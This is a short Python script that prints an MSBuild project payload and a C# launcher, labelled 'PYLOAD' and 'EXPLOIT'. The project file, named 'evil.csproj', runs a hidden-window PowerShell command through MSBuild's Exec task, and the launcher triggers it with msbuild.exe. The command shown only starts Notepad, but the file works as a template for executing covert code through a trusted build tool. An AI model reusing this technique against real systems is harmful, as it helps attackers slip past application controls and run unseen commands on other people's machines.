p = """
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Voldemort">
    <Exec Command="powershell -WindowStyle Hidden -Command \"Start-Process notepad\"" />
  </Target>
</Project>

"""
x = """
using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        string xmlPath = "evil.csproj";
        Console.WriteLine("[*] MSBuild tetikleniyor...");
        Process.Start("msbuild.exe", xmlPath);
    }
}

"""
print("                                 PYLOAD                                 ")
print("-----------------------------------------------------------------------------")
print(p)


print("                                  EXPLOIT                              ")
print("-----------------------------------------------------------------------------")
print(x)



